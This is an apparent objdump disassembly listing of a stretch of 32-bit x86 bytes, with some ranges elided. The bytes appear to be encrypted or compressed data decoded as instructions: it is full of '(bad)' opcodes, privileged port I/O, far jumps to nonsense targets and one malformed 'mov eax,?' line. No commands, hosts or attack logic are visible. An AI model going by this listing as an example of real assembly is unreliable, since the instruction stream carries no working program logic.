  42bd03:	test   al,0xe2
  42bd05:	inc    esi
  42bd06:	leave  
  42bd07:	ins    BYTE PTR es:[edi],dx
  42bd08:	(bad)  
  42bd09:	scas   eax,DWORD PTR es:[edi]
  42bd0a:	jae    0x42bcbf
  42bd0c:	mov    ecx,0x3fc8b6
	...
  42bd71:	add    BYTE PTR [eax],al
  42bd73:	add    BYTE PTR [eax-0x61eb634a],dh
  42bd79:	ds mov eax,0xffec3b6
  42bd7f:	jae    0x42bd43
  42bd81:	or     eax,0xd4d802c0
  42bd86:	add    DWORD PTR [eax],eax
  42bd88:	add    al,0x1
  42bd8a:	add    BYTE PTR [eax],al
  42bd8c:	mov    al,BYTE PTR [edi-0x2765a753]
  42bd92:	scas   al,BYTE PTR es:[edi]
  42bd93:	push   0x97033be3
  42bd98:	pop    edi
  42bd99:	xor    ebx,ecx
  42bd9b:	dec    edi
  42bd9c:	jnp    0x42bd46
  42bd9e:	inc    edx
  42bd9f:	popa   
  42bda0:	(bad)  
  42bda1:	fidiv  WORD PTR [ebx+ebx*4-0x1b]
  42bda5:	sub    al,dl
  42bda7:	fistp  WORD PTR [esi]
  42bda9:	push   ss
  42bdaa:	sbb    al,BYTE PTR [ebp-0x29]
  42bdad:	sub    DWORD PTR [edx],0xf03004e4
  42bdb3:	xor    eax,0x1870cd1c
  42bdb8:	retf   0x2d29
  42bdbb:	push   cs
  42bdbc:	mov    al,ds:0xd92ff042
  42bdc1:	retf   
  42bdc2:	mov    eax,ds:0xd00778f5
  42bdc7:	adc    al,0x2f
  42bdc9:	xchg   edi,eax
  42bdca:	clc    
  42bdcb:	in     eax,dx
  42bdcc:	ins    BYTE PTR es:[edi],dx
  42bdcd:	jmp    0x521a:0xe53f9c91
  42bdd4:	cdq    
  42bdd5:	or     al,0x8b
  42bdd7:	iret   
  42bdd8:	and    BYTE PTR [ebx-0x1d],0x41
  42bddc:	lods   al,BYTE PTR ds:[esi]
  42bddd:	xor    DWORD PTR [eax],edx
  42bddf:	fdivr  QWORD PTR [esi-0x3a]
  42bde2:	pop    ds
  42bde3:	dec    edx
  42bde4:	pop    ss
  42bde5:	inc    ebx
  42bde6:	add    BYTE PTR [eax+edi*2],ah
  42bde9:	les    edi,FWORD PTR [edi+0x47]
  42bdec:	(bad)  
  42bded:	jmp    0x9522:0x637b7130
  42bdf4:	cmc    
  42bdf5:	retf   0xede0
  42bdf8:	lods   al,BYTE PTR ds:[esi]
  42bdf9:	mov    eax,ds:0x7ce35b0e
  42bdfe:	ins    DWORD PTR es:[edi],dx
  42bdff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42be00:	sub    BYTE PTR [edi],0x4
  42be03:	jmp    0x42be5f
  42be05:	mov    dh,0xd4
  42be07:	fist   WORD PTR [eax-0x4e]
  42be0a:	les    edi,FWORD PTR [ebx-0x5d]
  42be0d:	sti    
  42be0e:	sub    BYTE PTR [esi-0x5794fb74],0x36
  42be15:	aas    
  42be16:	and    eax,0x4378ee78
  42be1b:	lahf   
  42be1c:	mov    al,ds:0xe28cd9c9
  42be21:	div    BYTE PTR [edx-0x36]
  42be24:	adc    al,0x16
  42be26:	mov    edx,0x715b76a4
  42be2b:	into   
  42be2c:	jecxz  0x42be27
  42be2e:	pop    eax
  42be2f:	mov    ch,0x71
  42be31:	stos   DWORD PTR es:[edi],eax
  42be32:	and    eax,0xc7af1512
  42be37:	lds    ebp,FWORD PTR [ecx]
  42be39:	call   0x90c:0x38009fdc
  42be40:	jb     0x42bea1
  42be42:	sub    bl,BYTE PTR [edi+0x7728bc79]
  42be48:	retf   0x2f6a
  42be4b:	adc    esp,DWORD PTR [edi+0x14]
  42be4e:	ficom  DWORD PTR [esi+eiz*1]
  42be51:	jae    0x42be37
  42be53:	ret    
  42be54:	mov    ch,0x4a
  42be56:	mov    dl,0xa6
  42be58:	jbe    0x42bed4
  42be5a:	and    eax,eax
  42be5c:	xlat   BYTE PTR ds:[ebx]
  42be5d:	out    0x3,eax
  42be5f:	std    
  42be60:	test   BYTE PTR [eax-0x73],0x40
  42be64:	and    BYTE PTR [edi],0xbf
  42be67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42be68:	push   es
  42be69:	aas    
  42be6a:	shl    BYTE PTR [ebx+0x5c],0x34
  42be6e:	stos   DWORD PTR es:[edi],eax
  42be6f:	mov    bl,0xe1
  42be71:	outs   dx,BYTE PTR ds:[esi]
  42be72:	jle    0x42be52
  42be74:	popf   
  42be75:	push   es
  42be76:	mov    eax,es:0xc6e1b156
  42be7c:	xchg   edi,eax
  42be7d:	inc    ebp
  42be7e:	lahf   
  42be7f:	stos   DWORD PTR es:[edi],eax
  42be80:	iret   
  42be81:	ins    DWORD PTR es:[edi],dx
  42be82:	jge    0x42befb
  42be84:	popf   
  42be85:	mov    ds:0x6539836c,al
  42be8a:	cmp    BYTE PTR [edi-0x37ee4704],bh
	...
  42bef4:	xchg   edi,eax
  42bef5:	and    BYTE PTR [edi-0x26],al
  42bef8:	idiv   edi
  42befa:	lahf   
  42befb:	ins    DWORD PTR es:[edi],dx
  42befc:	mov    ds:0x3a7bd7c8,eax
  42bf01:	mov    ds:0xd5dc04e5,al
  42bf06:	add    DWORD PTR [eax],eax
  42bf08:	add    al,0x1
  42bf0a:	add    BYTE PTR [eax],al
  42bf0c:	or     bl,BYTE PTR [edi]
  42bf0e:	pop    ss
  42bf0f:	mov    ebx,0x9df250c1
  42bf14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bf15:	xor    edi,DWORD PTR gs:[eax+0x2e]
  42bf19:	leave  
  42bf1a:	int    0x55
  42bf1c:	mov    ds:0xd31261,al
  42bf21:	(bad)  [ebp+0x52b75d71]
  42bf27:	pop    es
  42bf28:	pop    eax
  42bf29:	mov    bl,0x39
  42bf2b:	loop   0x42bf29
  42bf2d:	rcr    eax,1
  42bf2f:	cmp    BYTE PTR [esi-0x153b9250],bl
  42bf35:	mov    ss,WORD PTR [eax+ebx*1]
  42bf38:	aas    
  42bf39:	nop
  42bf3a:	les    edx,FWORD PTR [eax+ebx*2-0x60f44502]
  42bf41:	fadd   QWORD PTR [ebp-0x57]
  42bf44:	and    eax,0x765f699b
  42bf49:	(bad)  
  42bf4b:	add    al,0xaa
  42bf4d:	ficomp WORD PTR [ecx]
  42bf4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bf50:	adc    al,0x66
  42bf52:	mov    cs,WORD PTR [eax]
  42bf54:	mov    al,0x88
  42bf56:	mov    ebx,0x4d799268
  42bf5b:	xor    BYTE PTR [esp+ebp*1+0x74a9f215],cl
  42bf62:	jg     0x42beec
  42bf64:	push   ss
  42bf65:	mov    dl,BYTE PTR [eax+0x4ff29f14]
  42bf6b:	mov    ah,BYTE PTR [edx]
  42bf6d:	out    dx,eax
  42bf6e:	(bad)  
  42bf6f:	hlt    
  42bf70:	into   
  42bf71:	xlat   BYTE PTR ds:[ebx]
  42bf72:	cli    
  42bf73:	daa    
  42bf74:	cmc    
  42bf75:	call   0xfcbb:0x29fe200
  42bf7c:	adc    ecx,DWORD PTR [esi-0x12c8f96b]
  42bf82:	jo     0x42bfd2
  42bf84:	and    BYTE PTR [ebx],0x93
  42bf87:	icebp  
  42bf88:	or     eax,0xf98d42a0
  42bf8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bf8e:	add    esi,DWORD PTR [ebx]
  42bf90:	push   edx
  42bf91:	repz scas eax,DWORD PTR es:[edi]
  42bf93:	push   eax
  42bf94:	mov    ecx,0x37135768
  42bf99:	inc    edi
  42bf9a:	adc    DWORD PTR [eax],ebp
  42bf9c:	popa   
  42bf9d:	jge    0x42bfea
  42bf9f:	add    eax,eax
  42bfa1:	mov    al,BYTE PTR [eax+0x1f21a221]
  42bfa7:	cwde   
  42bfa8:	mov    ch,0xa8
  42bfaa:	cli    
  42bfab:	xchg   esi,eax
  42bfac:	outs   dx,DWORD PTR ds:[esi]
  42bfad:	adc    eax,eax
  42bfaf:	dec    esp
  42bfb0:	sbb    BYTE PTR [esi+0x2c],cl
  42bfb3:	daa    
  42bfb4:	and    dl,BYTE PTR [esi]
  42bfb6:	call   0x32512b21
  42bfbb:	and    DWORD PTR [ecx-0x6c3b5f32],eax
  42bfc1:	sbb    BYTE PTR [edi-0x428a21f7],bl
  42bfc7:	out    0xfc,eax
  42bfc9:	js     0x42bf50
  42bfcb:	ss pop edx
  42bfcd:	hlt    
  42bfce:	sub    ecx,ebx
  42bfd0:	imul   BYTE PTR [eax+ebp*8+0x7b30b564]
  42bfd7:	ficomp WORD PTR [ebx+0x76]
  42bfda:	shr    BYTE PTR [eax],1
  42bfdc:	std    
  42bfdd:	js     0x42bfa2
  42bfdf:	loopne 0x42c039
  42bfe1:	jbe    0x42c056
  42bfe3:	inc    edi
  42bfe4:	(bad)  
  42bfe5:	xchg   ebx,eax
  42bfe6:	cs enter 0x9016,0xa7
  42bfeb:	jbe    0x42c00a
  42bfed:	jmp    0x42c036
  42bfef:	adc    al,BYTE PTR [ebx-0x2e1767e5]
  42bff5:	mov    ebp,0x2f90a82b
  42bffa:	sub    BYTE PTR [eax-0x298e649c],al
  42c000:	push   eax
  42c001:	dec    esp
  42c002:	mov    DWORD PTR ds:0x6d64f5c1,eax
  42c008:	mov    cl,0xd0
  42c00a:	addr16 jno 0x42bf93
  42c00d:	stos   DWORD PTR es:[edi],eax
  42c00e:	int    0x69
	...
  42c074:	cmp    dl,BYTE PTR [edx-0x800cd89]
  42c07a:	jg     0x42c016
  42c07c:	leave  
  42c07d:	or     DWORD PTR [edi-0x57],edi
  42c080:	frstor [edi+0x28]
  42c083:	out    0xe0,al
  42c085:	(bad)  
  42c086:	add    DWORD PTR [eax],eax
  42c088:	add    al,0x1
  42c08a:	add    BYTE PTR [eax],al
  42c08c:	outs   dx,DWORD PTR ds:[esi]
  42c08d:	sbb    DWORD PTR [esi+0x5df787d1],edi
  42c093:	sbb    DWORD PTR [edi],ebx
  42c095:	into   
  42c096:	retf   
  42c097:	jp     0x42c0e5
  42c099:	inc    edx
  42c09a:	mov    cl,0x85
  42c09c:	sbb    eax,0x80b81d1d
  42c0a1:	dec    ebx
  42c0a2:	xor    edx,ebp
  42c0a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c0a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c0a6:	fmulp  st(5),st
  42c0a9:	aad    0xfe
  42c0ab:	sbb    dh,BYTE PTR [edi+0x7e]
  42c0ae:	add    eax,0x96b7c0d7
  42c0b3:	mov    eax,?
  42c0b5:	ret    0xc8a5
  42c0b8:	les    esi,FWORD PTR [ebx-0x761263d9]
  42c0be:	sbb    al,0xae
  42c0c0:	test   eax,0x19562bcd
  42c0c5:	(bad)  
  42c0c6:	aad    0xd7
  42c0c8:	jb     0x42c089
  42c0ca:	retf   
  42c0cb:	loop   0x42c055
  42c0cd:	mov    al,0x1c
  42c0cf:	jp     0x42c071
  42c0d1:	push   es
  42c0d2:	mov    ah,0xc6
  42c0d4:	dec    ebp
  42c0d5:	or     eax,0x61cdb26a
  42c0da:	jmp    0xf0f139e8
  42c0df:	std    
  42c0e0:	iret   
  42c0e1:	mov    edi,DWORD PTR [ebp-0x6ef8c5e4]
  42c0e7:	out    dx,al
  42c0e8:	popf   
  42c0e9:	cdq    
  42c0ea:	xor    eax,0x5027ccd
  42c0ef:	pop    es
  42c0f0:	inc    edi
  42c0f1:	nop
  42c0f2:	retf   0x40e5
  42c0f5:	sbb    al,0xff
  42c0f7:	jl     0x42c0b5
  42c0f9:	mov    eax,0xecbb9c50
  42c0fe:	(bad)  
  42c100:	mov    dh,0xef
  42c102:	mov    dh,0xd
  42c104:	add    DWORD PTR [ecx],esi
  42c106:	jmp    0x97c:0xbf8c1bab
  42c10d:	mov    bl,0xfc
  42c10f:	ds mov edx,0x261a72f1
  42c115:	dec    ebx
  42c116:	cld    
  42c117:	mov    dh,0xbb
  42c119:	inc    cl
  42c11b:	pop    ebx
  42c11c:	jl     0x42c107
  42c11e:	pop    ebx
  42c11f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c120:	ffreep st(2)
  42c122:	push   esp
  42c123:	or     BYTE PTR [esi],cl
  42c125:	dec    eax
  42c126:	sub    DWORD PTR [eax+0x5a],esi
  42c129:	js     0x42c0f7
  42c12b:	sahf   
  42c12c:	pop    ecx
  42c12d:	dec    edx
  42c12e:	jns    0x42c1a7
  42c130:	jmp    0xa1e765fe
  42c135:	or     eax,DWORD PTR [ebx+ecx*2+0x1d]
  42c139:	cli    
  42c13a:	sub    edi,DWORD PTR ds:[edx+0x44]
  42c13e:	pop    edi
  42c13f:	or     cl,0xa5
  42c142:	sub    DWORD PTR [eax-0x5979544a],ecx
  42c148:	fs sbb al,0x10
  42c14b:	mov    esp,0xcf6a7bca
  42c150:	mov    al,0x39
  42c152:	pop    es
  42c153:	call   0xcab:0xb416dfdc
  42c15a:	or     ecx,esi
  42c15c:	lds    eax,FWORD PTR [edx+0x48]
  42c15f:	adc    al,0x62
  42c161:	out    dx,eax
  42c162:	pop    ebx
  42c163:	mov    BYTE PTR [ebp+0x26],ch
  42c166:	ds and ebx,ebx
  42c169:	pop    ebp
  42c16a:	and    al,0xfd
  42c16c:	inc    ebp
  42c16d:	push   ebp
  42c16e:	ror    BYTE PTR [eax-0x21],0x18
  42c172:	dec    edx
  42c173:	pop    ss
  42c174:	pop    ebx
  42c175:	xchg   ebp,eax
  42c176:	adc    eax,0xcd3924ef
  42c17b:	cmp    eax,0x36ce2317
  42c180:	jmp    0x42c158
  42c182:	out    0x98,al
  42c184:	or     eax,0x1d8909c0
  42c189:	push   ecx
  42c18a:	add    DWORD PTR [ecx],esp
  42c18c:	jno    0x42c110
  42c18e:	in     al,0x87
	...
  42c1f4:	imul   eax,DWORD PTR [edx-0x10105133],0x90f2c76b
  42c1fe:	xchg   esp,eax
  42c1ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c200:	xor    ebp,edx
  42c202:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c203:	(bad)  
  42c204:	in     al,0xd7
  42c206:	add    DWORD PTR [eax],eax
  42c208:	add    al,0x1
  42c20a:	add    BYTE PTR [eax],al
  42c20c:	add    eax,0xb08f3399
  42c211:	out    0x7d,eax
  42c213:	(bad)  
  42c214:	cmp    al,0x92
  42c216:	adc    ecx,DWORD PTR [ebx]
  42c218:	mov    eax,ds:0xcb10230d
  42c21d:	jae    0x42c25e
  42c21f:	aaa    
  42c220:	retf   
  42c221:	sub    al,0xb6
  42c223:	inc    ebx
  42c224:	dec    edi
  42c225:	lahf   
  42c226:	scas   al,BYTE PTR es:[edi]
  42c227:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c228:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c229:	out    0x80,eax
  42c22b:	cmp    al,0xd4
  42c22d:	gs cmp eax,0x59f7e2a9
  42c233:	stc    
  42c234:	gs cmp eax,0xe5b03ee7
  42c23a:	sti    
  42c23b:	mov    eax,ebp
  42c23d:	pop    ds
  42c23e:	add    dl,BYTE PTR [esi+0x5]
  42c241:	ds retf 0xe783
  42c245:	jecxz  0x42c279
  42c247:	imul   ebx,ebx,0x3dea07d6
  42c24d:	pop    ds
  42c24e:	lods   al,BYTE PTR ds:[esi]
  42c24f:	and    DWORD PTR [esi+ecx*8+0x4],edi
  42c253:	push   0x50d124bd
  42c258:	jno    0x42c20f
  42c25a:	cld    
  42c25b:	idiv   BYTE PTR [ebp+ebp*1-0x19]
  42c25f:	(bad)  
  42c260:	jb     0x42c1e4
  42c262:	add    cl,BYTE PTR [ecx]
  42c264:	or     bh,BYTE PTR [ecx]
  42c266:	ds mov ch,dh
  42c269:	pop    ss
  42c26a:	in     eax,0xc8
  42c26c:	and    DWORD PTR [ebx+0x8],ecx
  42c26f:	pop    es
  42c270:	pop    es
  42c271:	xchg   ebp,eax
  42c272:	push   ebp
  42c273:	aad    0x8b
  42c275:	clc    
  42c276:	(bad)  
  42c277:	or     eax,0x1f99d69c
  42c27c:	mul    DWORD PTR ds:0xb4130646
  42c282:	int    0x25
  42c284:	pop    esp
  42c285:	jecxz  0x42c220
  42c287:	add    bh,dh
  42c289:	jmp    0x2fc9c10c
  42c28e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c28f:	aam    0x72
  42c291:	sub    bh,BYTE PTR [ebx]
  42c293:	outs   dx,DWORD PTR ds:[esi]
  42c294:	push   ebx
  42c295:	mov    ecx,DWORD PTR [edi-0x532c5fae]
  42c29b:	push   0xb
  42c29d:	and    DWORD PTR [edi+0x27],ecx
  42c2a0:	out    0x3e,al
  42c2a2:	jns    0x42c305
  42c2a4:	or     DWORD PTR [ecx+0xa],0xdb8f27f5
  42c2ab:	in     eax,dx
  42c2ac:	(bad)  
  42c2ad:	sub    bl,ah
  42c2af:	dec    ebx
  42c2b0:	fs jle 0x42c2dc
  42c2b3:	and    DWORD PTR [esi],ebp
  42c2b5:	adc    al,0x74
  42c2b7:	dec    ebx
  42c2b8:	imul   ecx,DWORD PTR [edx-0x3],0x61e1500e
  42c2bf:	or     al,0x36
  42c2c1:	ds out 0x53,al
  42c2c4:	mov    ss,ebp
  42c2c6:	icebp  
  42c2c7:	inc    edi
  42c2c8:	test   BYTE PTR [ebx],ch
  42c2ca:	dec    esp
  42c2cb:	dec    DWORD PTR [eax]
  42c2cd:	sbb    DWORD PTR [edi+esi*1+0x4b],edx
  42c2d1:	or     al,BYTE PTR [eax+ebx*4]
  42c2d4:	fadd   DWORD PTR [edx+0x2bd06fe5]
  42c2da:	jbe    0x42c33f
  42c2dc:	mov    ah,0x1a
  42c2de:	adc    al,BYTE PTR [edi+0x49]
  42c2e1:	sub    BYTE PTR [ebx-0x1e],0x74
  42c2e5:	aaa    
  42c2e6:	es in  al,0xf6
  42c2e9:	loop   0x42c2f9
  42c2eb:	dec    esp
  42c2ec:	mov    eax,ds:0xc27d5a1e
  42c2f1:	movzx  esp,BYTE PTR [esi+edi*8-0x7d536216]
  42c2f9:	in     al,0x68
  42c2fb:	int3   
  42c2fc:	mov    ds:0x8c22f3da,al
  42c301:	(bad)  
  42c302:	jp     0x42c2ff
  42c304:	iret   
  42c305:	call   0xba0c01e1
  42c30a:	cmp    dl,0x5
  42c30d:	mov    ebp,0x7e21
	...
  42c372:	add    BYTE PTR [eax],al
  42c374:	out    0xf,al
  42c376:	fldcw  WORD PTR [ebp-0x7]
  42c379:	push   esi
  42c37b:	(bad)  
  42c37c:	in     eax,dx
  42c37d:	(bad)  
  42c37e:	sub    eax,0x98e3b1f6
  42c383:	xchg   esi,eax
  42c384:	call   0x442c561
  42c389:	add    DWORD PTR [eax],eax
  42c38b:	add    BYTE PTR [eax+0x2d92a74e],al
  42c391:	jae    0x42c410
  42c393:	retf   
  42c394:	call   0x61f3:0x30b0289e
  42c39b:	cmp    ecx,DWORD PTR [esi]
  42c39d:	inc    esi
  42c39e:	aad    0x24
  42c3a0:	pop    esi
  42c3a1:	ja     0x42c355
  42c3a3:	xchg   ecx,eax
  42c3a4:	and    eax,0x6ea4268b
  42c3a9:	xchg   esi,eax
  42c3aa:	popf   
  42c3ab:	out    dx,eax
  42c3ac:	sub    BYTE PTR [ecx+0xd],al
  42c3af:	mov    eax,0x415ac2c5
  42c3b4:	xor    eax,0x942734d4
  42c3b9:	or     DWORD PTR [eax],esp
  42c3bb:	inc    ebp
  42c3bc:	jmp    0x59d9f241
  42c3c1:	sub    al,0x7b
  42c3c3:	mov    dl,0xd6
  42c3c5:	pop    eax
  42c3c6:	jbe    0x42c3b1
  42c3c8:	mov    esi,0x8cf0300a
  42c3cd:	push   edi
  42c3ce:	adc    esi,DWORD PTR gs:[ebx]
  42c3d1:	cs int3 
  42c3d3:	shl    DWORD PTR [ecx],1
  42c3d5:	jl     0x42c3c4
  42c3d7:	mov    ebp,0xeda0be82
  42c3dc:	and    al,0x7a
  42c3de:	std    
  42c3df:	fstp   QWORD PTR [esi+0x66]
  42c3e2:	pop    edi
  42c3e3:	mov    edx,0x3056eb8e
  42c3e8:	sahf   
  42c3e9:	jmp    0x42c3d2
  42c3eb:	rcr    BYTE PTR [esi-0x67],0xf8
  42c3ef:	in     al,0xde
  42c3f1:	xchg   ebp,eax
  42c3f2:	sbb    al,0xdb
  42c3f4:	mov    al,bl
  42c3f6:	fdivr  QWORD PTR [edi+ecx*8]
  42c3f9:	(bad)  
  42c3fa:	stos   BYTE PTR es:[edi],al
  42c3fb:	imul   DWORD PTR [edx-0x39]
  42c3fe:	popf   
  42c3ff:	inc    edi
  42c400:	aaa    
  42c401:	int3   
  42c402:	jecxz  0x42c45e
  42c404:	mov    ah,0x1d
  42c406:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c407:	jle    0x42c41a
  42c409:	cs jne 0x42c406
  42c40c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c40d:	call   0x9c25:0x595efe7c
  42c414:	jns    0x42c3b7
  42c416:	fisttp DWORD PTR [ebp-0x65]
  42c419:	jb     0x42c3f7
  42c41b:	jge    0x42c3a3
  42c41d:	xchg   esi,eax
  42c41e:	dec    ebx
  42c41f:	les    ecx,FWORD PTR [ebx+0x43]
  42c422:	pop    ss
  42c423:	sbb    eax,0x9e5e296d
  42c428:	xchg   edx,eax
  42c429:	pop    es
  42c42a:	test   eax,0x714c1b0c
  42c42f:	outs   dx,DWORD PTR ds:[esi]
  42c430:	xchg   DWORD PTR [edx-0x4941b08d],edi
  42c436:	and    dh,al
  42c438:	jae    0x42c4ac
  42c43a:	pop    ebp
  42c43b:	cmp    DWORD PTR [ebx+0x20700419],eax
  42c441:	out    0xc6,al
  42c443:	fidivr DWORD PTR [edx+0x1b621269]
  42c449:	sub    edi,eax
  42c44b:	inc    ebp
  42c44c:	mov    edi,0xe197a317
  42c451:	test   BYTE PTR [ecx],ch
  42c453:	mov    BYTE PTR [edi],bh
  42c455:	fcom   DWORD PTR [eax-0x42]
  42c458:	or     eax,0xc4e1a775
  42c45d:	push   ecx
  42c45e:	(bad)  
  42c45f:	cmp    eax,0xd719b815
  42c464:	cmp    DWORD PTR [eax+ecx*8-0x23b6f0eb],0x68
  42c46c:	mov    edi,0x12f74d57
  42c471:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c472:	sar    BYTE PTR [eax+0x6],0xe
  42c476:	fidivr DWORD PTR [edi+0x4afde86e]
  42c47c:	dec    eax
  42c47d:	out    dx,al
  42c47e:	in     al,0x66
  42c480:	ror    esi,0xe
  42c483:	lods   eax,DWORD PTR ds:[esi]
  42c484:	push   esi
  42c485:	push   ecx
  42c486:	loop   0x42c48c
  42c488:	(bad)  
  42c489:	jmp    0x42c4b4
  42c48b:	adc    eax,0xd960da24
	...
  42c4f4:	in     al,dx
  42c4f5:	sbb    ebp,edx
  42c4f7:	sahf   
  42c4f8:	cmc    
  42c4f9:	fsubp  st(7),st
  42c4fb:	jnp    0x42c4af
  42c4fd:	sti    
  42c4fe:	enter  0x34,0xd6
  42c502:	inc    edi
  42c503:	imul   ebp,esp,0xffffffd9
  42c506:	add    DWORD PTR [eax],eax
  42c508:	add    al,0x1
  42c50a:	add    BYTE PTR [eax],al
  42c50c:	xor    eax,0x22891718
  42c511:	mov    esi,0x52d9beed
  42c516:	pushf  
  42c517:	mov    dl,0x64
  42c519:	adc    BYTE PTR [ecx+0x71e6257b],cl
  42c51f:	sub    esp,eax
  42c521:	add    cl,BYTE PTR ds:0x1b8e46df
  42c527:	push   ebx
  42c528:	and    ch,bh
  42c52a:	push   eax
  42c52b:	add    cl,ch
  42c52d:	xchg   edi,eax
  42c52e:	pop    esi
  42c52f:	or     dl,BYTE PTR [ebp-0x6c]
  42c532:	pop    es
  42c533:	mov    al,ds:0xb156d489
  42c538:	xchg   esp,eax
  42c539:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c53a:	jae    0x42c562
  42c53c:	mov    edi,es
  42c53e:	xchg   ebx,eax
  42c53f:	xor    al,0x6c
  42c541:	cmp    BYTE PTR [ebx+0x22],cl
  42c544:	leave  
  42c545:	cmp    BYTE PTR [ebx-0x59a6a8b7],cl
  42c54b:	fistp  DWORD PTR [edi]
  42c54d:	jmp    0xfee32e48
  42c552:	xor    BYTE PTR [ebp-0x4aacea68],dh
  42c558:	jns    0x42c526
  42c55a:	scas   eax,DWORD PTR es:[edi]
  42c55b:	out    dx,al
  42c55c:	scas   al,BYTE PTR es:[edi]
  42c55d:	(bad)  
  42c55e:	mov    eax,0x56e23fed
  42c563:	inc    eax
  42c564:	les    esp,FWORD PTR [edi-0x19f0714]
  42c56a:	xchg   edx,eax
  42c56b:	scas   al,BYTE PTR es:[edi]
  42c56c:	xor    BYTE PTR [ecx],dl
  42c56e:	out    dx,eax
  42c56f:	adc    dh,BYTE PTR [eax+0x3147f6c8]
  42c575:	adc    BYTE PTR [edi-0x32],0xec
  42c579:	aaa    
  42c57a:	pop    edi
  42c57b:	sub    ah,BYTE PTR [ebp+0x7]
  42c57e:	or     DWORD PTR [edx+edx*1+0x69],edx
  42c582:	xchg   esp,eax
  42c583:	dec    ecx
  42c584:	stos   BYTE PTR es:[edi],al
  42c585:	scas   eax,DWORD PTR es:[edi]
  42c586:	js     0x42c592
  42c588:	and    esp,DWORD PTR [esi]
  42c58a:	clc    
  42c58b:	ret    0xc770
  42c58e:	pop    edx
  42c58f:	dec    ebx
  42c590:	rcl    BYTE PTR [esi+edx*1-0x7b2f8844],cl
  42c597:	xchg   edi,eax
  42c598:	aam    0xdd
  42c59a:	(bad)  
  42c59b:	fbstp  TBYTE PTR [edx-0x30843ba7]
  42c5a1:	or     DWORD PTR [ebp-0x59],0x55
  42c5a5:	test   DWORD PTR [esi],esi
  42c5a7:	add    al,0xa7
  42c5a9:	adc    BYTE PTR ds:0x85c57aa2,dh
  42c5af:	inc    ebx
  42c5b0:	inc    esi
  42c5b1:	ja     0x42c5d5
  42c5b3:	loopne 0x42c606
  42c5b5:	imul   esp,DWORD PTR [esp+ebx*1-0x3f],0xffffffb3
  42c5ba:	push   ss
  42c5bb:	je     0x42c602
  42c5bd:	push   edx
  42c5be:	scas   eax,DWORD PTR es:[edi]
  42c5bf:	icebp  
  42c5c0:	les    edi,FWORD PTR [edx-0x4ef1d5ab]
  42c5c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c5c7:	out    0x66,eax
  42c5c9:	pop    esp
  42c5ca:	int    0x98
  42c5cc:	ins    BYTE PTR es:[edi],dx
  42c5cd:	sub    edx,DWORD PTR [esi-0x2825f12a]
  42c5d3:	push   esi
  42c5d4:	mov    ds:0xc3a5fa1b,eax
  42c5d9:	inc    esp
  42c5da:	je     0x42c584
  42c5dc:	out    dx,eax
  42c5dd:	push   cs
  42c5de:	adc    esi,DWORD PTR [edx+0x5c]
  42c5e1:	dec    ecx
  42c5e2:	arpl   cx,cx
  42c5e4:	mov    cl,BYTE PTR [edi+ebx*4+0x1bc92f48]
  42c5eb:	mov    bl,0xb2
  42c5ee:	xor    BYTE PTR [edi-0x29],ch
  42c5f1:	loope  0x42c61b
  42c5f3:	pop    ecx
  42c5f4:	sub    dl,0x65
  42c5f7:	std    
  42c5f8:	add    eax,0x327c5836
  42c5fd:	outs   dx,DWORD PTR ds:[esi]
  42c5fe:	mov    edi,0x785b0408
  42c603:	cmp    DWORD PTR [edi],edi
  42c605:	(bad)  
  42c606:	ret    0x1b66
  42c609:	xchg   esp,eax
  42c60a:	or     edx,eax
  42c60c:	aam    0x14
  42c60e:	sahf   
  42c60f:	xchg   esp,eax
	...
  42c674:	pop    ebp
  42c675:	dec    eax
  42c676:	jle    0x42c606
  42c678:	jg     0x42c638
  42c67a:	std    
  42c67b:	fstp   TBYTE PTR [ebx-0x29920395]
  42c681:	(bad)  
  42c682:	das    
  42c683:	aad    0xf0
  42c685:	fiadd  DWORD PTR [ecx]
  42c687:	add    BYTE PTR [ecx+eax*1],al
  42c68a:	add    BYTE PTR [eax],al
  42c68c:	jmp    0x8ca2:0x77b42c7b
  42c693:	call   0x9312:0x9a6bd675
  42c69a:	test   BYTE PTR [esi+0x3f23386b],bl
  42c6a0:	mov    ds:0xf426a3ae,al
  42c6a5:	add    DWORD PTR ss:[ebx-0x80],esi
  42c6a9:	retf   0x8b32
  42c6ac:	cmp    BYTE PTR [edi-0x74891540],cl
  42c6b2:	retf   
  42c6b3:	out    dx,eax
  42c6b4:	pop    esi
  42c6b5:	jae    0x42c6f4
  42c6b7:	jno    0x42c688
  42c6b9:	cmc    
  42c6ba:	ror    al,cl
  42c6bc:	sbb    esi,DWORD PTR [eax+0x56]
  42c6bf:	pop    ds
  42c6c0:	out    0x62,al
  42c6c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c6c3:	xlat   BYTE PTR ds:[ebx]
  42c6c5:	cs inc edi
  42c6c7:	inc    esp
  42c6c8:	stos   DWORD PTR es:[edi],eax
  42c6c9:	iret   
  42c6ca:	in     eax,0xf
  42c6cc:	jbe    0x42c747
  42c6ce:	scas   eax,DWORD PTR es:[edi]
  42c6cf:	sahf   
  42c6d0:	adc    BYTE PTR [ecx],ah
  42c6d2:	mov    al,0x3
  42c6d4:	mov    al,0x47
  42c6d6:	ja     0x42c6c9
  42c6d8:	mov    cs,WORD PTR [eax]
  42c6da:	popa   
  42c6db:	leave  
  42c6dc:	repz sbb ebp,DWORD PTR [edx+0x2f031e04]
  42c6e3:	and    eax,esi
  42c6e5:	shl    DWORD PTR [edx-0x59180636],1
  42c6eb:	dec    esi
